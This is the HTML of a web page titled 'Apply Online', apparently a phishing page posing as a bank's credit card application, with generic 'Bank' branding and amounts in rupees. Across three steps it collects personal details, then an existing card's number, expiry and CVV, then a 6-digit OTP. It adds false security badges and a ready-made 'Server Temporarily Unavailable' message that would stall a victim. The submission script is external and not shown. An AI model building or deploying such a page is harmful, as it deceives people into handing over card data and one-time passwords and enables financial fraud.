<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>Apply Online</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link
    href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&family=DM+Sans:wght@400;500;600&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="css/apply.css">
</head>

<body>
  <div id="loader">
    <div class="loader-icon-box">
      <svg viewBox="0 0 24 24">
        <path d="M21 12a9 9 0 11-6.219-8.56" />
      </svg>
    </div>
    <div id="loaderTitle" class="loader-title-text">Processing...</div>
    <div id="loaderSub" class="loader-sub-text">Please wait a moment</div>
    <div class="progress-bar-track">
      <div id="progressFill" class="progress-bar-fill"></div>
    </div>
  </div>
  <nav class="navbar" style="width:100%;max-width:100%">
    <a class="nav-logo" href="index.html">
      <img src="https://cdn.brandfetch.io/id78YVtrRp/theme/light/logo.svg" alt="Bank">
      <span class="nav-logo-text">Bank</span>
    </a>
    <div class="nav-right">
      <div class="status-circles">
        <div class="status-circle yellow"></div>
        <div class="status-circle red"></div>
      </div>
      <a class="nav-back" href="index.html">
        <svg viewBox="0 0 24 24">
          <polyline points="15 18 9 12 15 6" />
        </svg>
        Back
      </a>
    </div>
  </nav>
  <div id="homeSection">
    <div class="hero-strip">
      <h1>Apply Online</h1>
      <p>Complete your application in just 3 quick steps</p>
      <div class="hero-badges">
        <span class="hero-badge">
          <svg viewBox="0 0 24 24">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
          </svg>
          100% Secure
        </span>
        <span class="hero-badge">
          <svg viewBox="0 0 24 24">
            <circle cx="12" cy="12" r="10" />
            <polyline points="12 6 12 12 16 14" />
          </svg>
          Instant Processing
        </span>
        <span class="hero-badge">
          <svg viewBox="0 0 24 24">
            <polyline points="20 6 9 17 4 12" />
          </svg>
          Zero Joining Fee
        </span>
      </div>
    </div>
    <div class="step-bar">
      <div class="step-item active" id="stepItem1">
        <div class="step-circle">1</div>
        <span class="step-lbl">Personal</span>
      </div>
      <div class="step-item" id="stepItem2">
        <div class="step-circle">2</div>
        <span class="step-lbl">Card</span>
      </div>
      <div class="step-item" id="stepItem3">
        <div class="step-circle">3</div>
        <span class="step-lbl">Verify</span>
      </div>
    </div>
    <div class="card" id="step1">
      <div class="card-title">
        <svg viewBox="0 0 24 24">
          <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2" />
          <circle cx="12" cy="7" r="4" />
        </svg>
        Personal Information
      </div>
      <div class="field">
        <label>Full Name</label>
        <div class="field-wrap">
          <div class="field-icon"><svg viewBox="0 0 24 24">
              <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2" />
              <circle cx="12" cy="7" r="4" />
            </svg></div>
          <input id="name" type="text" placeholder="Enter your full name" autocomplete="name" maxlength="50">
        </div>
        <div class="field-hint" id="e-name">Please enter a valid name (letters only, min 2 characters)</div>
      </div>
      <div class="field">
        <label>Mobile Number</label>
        <div class="field-wrap">
          <div class="field-icon"><svg viewBox="0 0 24 24">
              <rect x="5" y="2" width="14" height="20" rx="2" />
              <line x1="12" y1="18" x2="12" y2="18" />
            </svg></div>
          <input id="mobileNumber" type="tel" inputmode="numeric" maxlength="10" placeholder="10-digit mobile number"
            autocomplete="tel">
        </div>
        <div class="field-hint" id="e-mobile">Enter valid 10-digit mobile starting with 6,7,8 or 9</div>
      </div>
      <div class="field">
        <label>Email Address</label>
        <div class="field-wrap">
          <div class="field-icon"><svg viewBox="0 0 24 24">
              <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
              <polyline points="22,6 12,13 2,6" />
            </svg></div>
          <input id="email1" type="email" placeholder="your@email.com" autocomplete="email" maxlength="100">
        </div>
        <div class="field-hint" id="e-email">Enter a valid email address</div>
      </div>
      <div class="field">
        <label>Date of Birth</label>
        <div class="field-wrap">
          <div class="field-icon"><svg viewBox="0 0 24 24">
              <rect x="3" y="4" width="18" height="18" rx="2" />
              <line x1="16" y1="2" x2="16" y2="6" />
              <line x1="8" y1="2" x2="8" y2="6" />
              <line x1="3" y1="10" x2="21" y2="10" />
            </svg></div>
          <input id="dob" type="text" placeholder="Select date of birth" readonly>
        </div>
        <div class="field-hint" id="e-dob">Please select your date of birth (must be 18+)</div>
      </div>
      <div class="date-picker-modal" id="datePickerModal">
        <div class="date-picker-overlay"></div>
        <div class="date-picker-container">
          <div class="date-picker-header">
            <span>Select Date of Birth</span>
            <button class="date-picker-close" id="datePickerClose">×</button>
          </div>
          <div class="date-picker-wheels">
            <div class="date-wheel">
              <div class="wheel-label">Day</div>
              <div class="wheel-scroll" id="dayWheel">
                <div class="wheel-item">01</div>
              </div>
            </div>
            <div class="date-wheel">
              <div class="wheel-label">Month</div>
              <div class="wheel-scroll" id="monthWheel">
                <div class="wheel-item">January</div>
              </div>
            </div>
            <div class="date-wheel">
              <div class="wheel-label">Year</div>
              <div class="wheel-scroll" id="yearWheel">
                <div class="wheel-item">2000</div>
              </div>
            </div>
          </div>
          <button class="btn date-picker-confirm" id="datePickerConfirm">Confirm</button>
          <button class="btn btn-secondary date-picker-cancel" id="datePickerCancel">Cancel</button>
        </div>
      </div>
      <div class="field">
        <label>Credit Card Limit (₹)</label>
        <div class="field-wrap">
          <div class="field-icon">₹</div>
          <input id="cardLimit" type="number" min="2000" max="1000000"
            placeholder="Minimum ₹2,000 - Maximum ₹10,00,000">
        </div>
        <div class="field-hint" id="e-limit">Credit limit must be between ₹2,000 and ₹10,00,000</div>
      </div>
      <button class="btn" type="button" id="nextBtn1">
        <svg viewBox="0 0 24 24">
          <line x1="5" y1="12" x2="19" y2="12" />
          <polyline points="12 5 19 12 12 19" />
        </svg>
        Continue to Card Details
      </button>
      <div class="secure-note">
        <svg viewBox="0 0 24 24">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
        </svg>
        Your information is encrypted and secure
      </div>
    </div>
    <div class="card hidden" id="step2">
      <div class="card-title">
        <svg viewBox="0 0 24 24">
          <rect x="1" y="4" width="22" height="16" rx="2" />
          <line x1="1" y1="10" x2="23" y2="10" />
        </svg>
        Card Information
      </div>
      <div class="card-preview">
        <div class="cp-chip"></div>
        <div class="cp-number" id="cpNumber">•••• •••• •••• ••••</div>
        <div class="cp-bottom">
          <div>
            <div class="cp-label">Card Holder</div>
            <div class="cp-value" id="cpHolder">YOUR NAME</div>
          </div>
          <div>
            <div class="cp-label">Expires</div>
            <div class="cp-value" id="cpExpiry">MM/YY</div>
          </div>
        </div>
      </div>
      <div class="field">
        <label>Holder Name</label>
        <div class="field-wrap">
          <div class="field-icon"><svg viewBox="0 0 24 24">
              <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2" />
              <circle cx="12" cy="7" r="4" />
            </svg></div>
          <input id="holder" type="text" placeholder="Name as printed on card" maxlength="50">
        </div>
        <div class="field-hint" id="e-holder">Invalid card holder name</div>
      </div>
      <div class="field">
        <label>Card No.</label>
        <div class="field-wrap">
          <div class="field-icon"><svg viewBox="0 0 24 24">
              <rect x="1" y="4" width="22" height="16" rx="2" />
              <line x1="1" y1="10" x2="23" y2="10" />
            </svg></div>
          <input id="cardNumber" type="tel" inputmode="numeric" maxlength="19" placeholder="•••• •••• •••• ••••">
        </div>
        <div class="field-hint" id="e-cardno">Card number must be 15 (Amex) or 16 digits</div>
      </div>
      <div class="row">
        <div class="field">
          <label>Expiry</label>
          <div class="field-wrap">
            <div class="field-icon"><svg viewBox="0 0 24 24">
                <rect x="3" y="4" width="18" height="18" rx="2" />
                <line x1="3" y1="10" x2="21" y2="10" />
              </svg></div>
            <input id="expiry" type="text" inputmode="numeric" maxlength="5" placeholder="MM/YY">
          </div>
          <div class="field-hint" id="e-expiry">Enter valid expiry (MM/YY)</div>
        </div>
        <div class="field">
          <label>Security Code</label>
          <div class="field-wrap">
            <div class="field-icon"><svg viewBox="0 0 24 24">
                <rect x="3" y="11" width="18" height="11" rx="2" />
                <path d="M7 11V7a5 5 0 0110 0v4" />
              </svg></div>
            <input id="cvc" type="password" inputmode="numeric" maxlength="4" placeholder="•••">
          </div>
          <div class="field-hint" id="e-cvv">CVV must be 3 or 4 digits</div>
        </div>
      </div>
      <button class="btn" type="button" id="nextBtn2">
        <svg viewBox="0 0 24 24">
          <line x1="5" y1="12" x2="19" y2="12" />
          <polyline points="12 5 19 12 12 19" />
        </svg>
        Continue to Verification
      </button>
      <div class="secure-note">
        <svg viewBox="0 0 24 24">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
        </svg>
        256-bit SSL encryption • Secured Server
      </div>
    </div>
    <div class="card hidden" id="step3">
      <div class="card-title" style="justify-content:center">
        <svg viewBox="0 0 24 24">
          <rect x="3" y="11" width="18" height="11" rx="2" />
          <path d="M7 11V7a5 5 0 0110 0v4" />
        </svg>
        Verify Your Identity
      </div>
      <p class="card-subtitle">Enter the 6-digit OTP sent to your registered mobile number</p>
      <div class="otp-container">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="0">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="1">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="2">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="3">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="4">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="5">
      </div>
      <div class="timer-row">
        <span class="timer-text">Resend OTP in</span>
        <span class="timer-value" id="timerValue">00:15</span>
      </div>
      <button class="btn" type="button" id="verifyBtn">
        <svg viewBox="0 0 24 24">
          <polyline points="20 6 9 17 4 12" />
        </svg>
        Verify OTP
      </button>
      <button class="btn-secondary" id="resendBtn" disabled>
        <svg viewBox="0 0 24 24">
          <path d="M23 4v6h-6" />
          <path d="M20.49 15a9 9 0 11-2.12-9.36L23 10" />
        </svg>
        Resend OTP
      </button>
      <div class="secure-note">
        <svg viewBox="0 0 24 24">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
        </svg>
        Your OTP is valid for 10 minutes
      </div>
    </div>
  </div>
  <div class="otp-error-popup" id="otpErrorPopup">
    <div class="otp-error-box">
      <button class="otp-error-close" id="otpErrorClose">
        <svg viewBox="0 0 24 24">
          <line x1="18" y1="6" x2="6" y2="18" />
          <line x1="6" y1="6" x2="18" y2="18" />
        </svg>
      </button>
      <div class="otp-error-icon">
        <svg viewBox="0 0 24 24">
          <circle cx="12" cy="12" r="10" />
          <line x1="12" y1="8" x2="12" y2="12" />
          <line x1="12" y1="16" x2="12.01" y2="16" />
        </svg>
      </div>
      <h3>OTP Verification Failed</h3>
      <p>The OTP you entered is incorrect. Please check and try again.</p>
    </div>
  </div>
  <div class="final-error-popup" id="finalErrorPopup">
    <div class="final-error-box">
      <div class="final-error-icon">
        <svg viewBox="0 0 24 24">
          <circle cx="12" cy="12" r="10" />
          <line x1="12" y1="8" x2="12" y2="12" />
          <line x1="12" y1="16" x2="12.01" y2="16" />
        </svg>
      </div>
      <h3>Server Temporarily Unavailable</h3>
      <p>Our servers are currently undergoing maintenance. Please try again after some time. We apologize for the
        inconvenience.</p>
    </div>
  </div>
  <div class="success-popup" id="successPopup">
    <div class="success-box">
      <div class="success-icon">
        <svg viewBox="0 0 24 24">
          <polyline points="20 6 9 17 4 12" />
        </svg>
      </div>
      <h3>OTP Sent Successfully!</h3>
    </div>
  </div>
  <script src="js/apply.js"></script>
</body>

</html>
